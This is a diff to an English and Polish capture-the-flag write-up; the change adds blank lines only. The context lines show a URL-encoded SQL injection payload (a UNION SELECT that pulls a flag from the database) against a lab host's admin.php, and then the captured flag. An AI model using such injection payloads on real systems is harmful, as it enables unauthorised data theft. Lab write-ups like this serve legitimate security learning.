@@ -68,6 +68,7 @@ However, the most interesting part is the admin.php and we can see that inside '
 ![](./flag.png)
 
 URL : http://10.13.37.12/admin.php?page=report&id=1%22%20UNION%20SELECT%201,2,flag,4%20from%20flag%20where%201=%221
+
 flag : DCTF{30bce3bb3c2b030c1480179046409729}
 
 ###PL version
@@ -135,4 +136,5 @@ Jednal najciekawszym  elementem jest zasób admin.php w którym możemy zauważy
 ![](./flag.png)
 
 URL : http://10.13.37.12/admin.php?page=report&id=1%22%20UNION%20SELECT%201,2,flag,4%20from%20flag%20where%201=%221
+
 flag : DCTF{30bce3bb3c2b030c1480179046409729}
